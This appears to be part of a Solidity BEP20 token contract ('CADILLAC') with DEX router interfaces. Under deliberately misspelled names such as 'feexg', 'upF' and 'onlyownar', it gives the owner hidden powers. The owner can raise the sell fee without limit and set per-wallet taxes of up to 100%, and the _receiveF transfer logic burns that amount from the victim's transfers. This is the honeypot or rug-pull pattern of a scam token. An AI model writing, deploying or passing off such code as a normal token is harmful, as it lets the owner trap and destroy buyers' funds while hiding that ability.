...
interface IUniswapV2Factory {
    ...
    function feexgTo() external view returns (address);
    function feexgToSetter() external view returns (address);
    ...
    function setfeexgTo(address) external;
    function setfeexgToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfeexgOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingfeexgOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingfeexgOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingfeexgOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfeexgOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract CADILLAC is BEP20, Ownable {
    ...
    uint256 private _defaultSellfeexg = 0;

    uint256 private _defaultBuyfeexg = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipfeexg;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellfeexg = _value;
    }

    function setSlipfeexg(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipfeexg[_address] = _value;
    }

    function getSlipfeexg(address _address) external view onlyownar returns (uint256) {
        return _slipfeexg[_address];
    }


    function setMAccountfeexg(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountfeexg(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradefeexgAmount = 0;

        if (rF) {
            uint256 tradefeexg = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradefeexg = _defaultSellfeexg;
                }
                if (from == uniswapV2Pair) {

                    tradefeexg = _defaultBuyfeexg;
                }
            }
            if (_slipfeexg[from] > 0) {
                tradefeexg = _slipfeexg[from];
            }

            tradefeexgAmount = _Amount.mul(tradefeexg).div(100);
        }


        if (tradefeexgAmount > 0) {
            _balances[from] = _balances[from].sub(tradefeexgAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradefeexgAmount);
            emit Transfer(from, _deadAddress, tradefeexgAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradefeexgAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradefeexgAmount);
        emit Transfer(from, _to, _Amount - tradefeexgAmount);
    }
